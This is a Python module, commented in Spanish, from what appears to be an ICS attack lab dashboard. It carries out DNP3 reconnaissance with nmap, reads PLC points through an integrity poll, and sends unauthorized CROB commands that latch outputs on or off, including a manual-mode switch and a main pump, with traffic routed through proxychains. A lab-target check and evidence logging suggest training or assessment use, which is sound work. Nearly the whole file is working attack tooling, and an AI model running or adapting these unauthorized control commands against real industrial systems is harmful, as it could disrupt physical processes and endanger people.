#!/usr/bin/env python3
"""
Ataques DNP3.  Reconocimiento (nmap) + lectura/escritura con raw sockets.

MITRE ATT&CK for ICS:
  - T0846 / T0888 Discovery (recon)
  - T0861 Point & Tag Identification (lectura)
  - T0855 Unauthorized Command Message (escritura CROB)

Arquitectura dual-mode: igual que s7_snap7. nmap se lanza directamente envuelto
por `runner.wrap_proxy`; las acciones DNP3 raw se lanzan como subproceso via
`_cli.dnp3_cli` tambien envuelto por `wrap_proxy` (proxychains en modo empresa).
"""

import config
from core import runner, evidence
from modules import dnp3_raw


# ---------------------------------------------------------------------------
# Implementacion in-process (la ejecuta el subproceso _cli)
# ---------------------------------------------------------------------------

_LABELS_BIN = dnp3_raw.LABELS_BIN
_LABELS_ANA = dnp3_raw.LABELS_ANA


def _do_read(ip, port, sink):
    sink(f"[*] Conectando a PLC DNP3 en {ip}:{port}...")
    try:
        result = dnp3_raw.dnp3_read(ip, int(port), timeout=20, sink=sink)
    except Exception as e:
        sink(f"[!] Error en la lectura DNP3: {e}")
        return

    sink("[+] Integrity poll completado.")
    sink("")
    sink("=" * 50)
    sink("        LECTURA DNP3 (Integrity Poll)")
    sink("=" * 50)

    for idx in sorted(result["binary"]):
        if idx > 3:
            continue
        label = _LABELS_BIN.get(idx, f"Output {idx}")
        val = "ON" if result["binary"][idx] else "OFF"
        sink(f" [BOUT] Indice {idx} | {label}: {val}")

    for idx in sorted(result["analog"]):
        if idx > 1:
            continue
        label = _LABELS_ANA.get(idx, f"Analogico {idx}")
        val = result["analog"][idx]
        sink(f" [AOUT] Indice {idx} | {label}: {val:.2f}")

    if not result["binary"] and not result["analog"]:
        sink(" (sin datos — el outstation no devolvio puntos)")

    sink("=" * 50)
    sink("[+] Sesion DNP3 finalizada.")


def _do_write(ip, port, index, value, sink):
    v = str(value).lower() in ("1", "true", "on", "yes") if isinstance(value, str) else bool(value)
    action = "LATCH_ON" if v else "LATCH_OFF"
    sink(f"[*] Conectando a PLC DNP3 en {ip}:{port}...")
    sink(f"[*] Enviando CROB {action} al indice {index}...")
    try:
        ok = dnp3_raw.dnp3_write_crob(ip, int(port), index=int(index),
                                       latch_on=v, timeout=20, sink=sink)
    except Exception as e:
        sink(f"[!] Error en la escritura DNP3: {e}")
        return

    if ok:
        sink(f"[+] CROB {action} -> indice {index}: CONFIRMADO por el outstation.")
    else:
        sink(f"[-] CROB {action} -> indice {index}: el outstation devolvio estado != 0.")
    sink("[+] Sesion DNP3 finalizada.")


# ---------------------------------------------------------------------------
# Funciones publicas (dashboard)
# ---------------------------------------------------------------------------

def discover(target=None, sink=None):
    """nmap -sT -p 20000 <red/ip> (recon DNP3)."""
    target = target or "192.168.40.0/24"
    if "/" not in target:
        runner.assert_lab_target(target)
    path = evidence.new_evidence_file("dnp3", "discover")
    evidence.header(path, "DNP3 - Descubrimiento (puerto 20000)",
                    target, config.MITRE_MAP["dnp3.discover_nmap"])
    cmd = runner.wrap_proxy(runner.wrap_live(
        ["nmap", "-sT", "-Pn", "-p", "20000", target]))
    runner.run_command(cmd, path, sink=sink, timeout=600)
    return path


def _launch_cli(action, args, path, sink):
    cmd = ["python3", "-m", "modules._cli.dnp3_cli", action] + args
    cmd = runner.wrap_proxy(cmd)
    runner.run_command(cmd, path, sink=sink, timeout=60, cwd=config.BASE_DIR)


def read(target=None, port=None, sink=None):
    """Lectura de puntos DNP3 (integrity poll) con raw sockets."""
    ip = runner.assert_lab_target(target or config.DNP3_DEFAULT_TARGET)
    port = port or config.DNP3_DEFAULT_PORT
    path = evidence.new_evidence_file("dnp3", "read")
    evidence.header(path, "DNP3 - Lectura de puntos (integrity poll)",
                    f"{ip}:{port}", config.MITRE_MAP["dnp3.read"])
    _launch_cli("read", ["--target", ip, "--port", str(port)], path, sink)
    return path


def write_modo_manual(target=None, port=None, value=True, sink=None):
    """Activa o desactiva el Modo Manual (%QX0.2) via CROB en indice 2."""
    ip = runner.assert_lab_target(target or config.DNP3_DEFAULT_TARGET)
    port = port or config.DNP3_DEFAULT_PORT
    path = evidence.new_evidence_file("dnp3", "write_manual")
    evidence.header(path, "DNP3 - Modo Manual (CROB indice 2)",
                    f"{ip}:{port} value={value}",
                    config.MITRE_MAP["dnp3.write_manual"])
    _launch_cli("write",
                ["--target", ip, "--port", str(port),
                 "--index", "2", "--value", str(value)],
                path, sink)
    return path


def write_bomba(target=None, port=None, value=True, sink=None):
    """Activa o desactiva la Bomba Principal (%QX0.3) via CROB en indice 3."""
    ip = runner.assert_lab_target(target or config.DNP3_DEFAULT_TARGET)
    port = port or config.DNP3_DEFAULT_PORT
    path = evidence.new_evidence_file("dnp3", "write_bomba")
    evidence.header(path, "DNP3 - Bomba Principal (CROB indice 3)",
                    f"{ip}:{port} value={value}",
                    config.MITRE_MAP["dnp3.write_bomba"])
    _launch_cli("write",
                ["--target", ip, "--port", str(port),
                 "--index", "3", "--value", str(value)],
                path, sink)
    return path
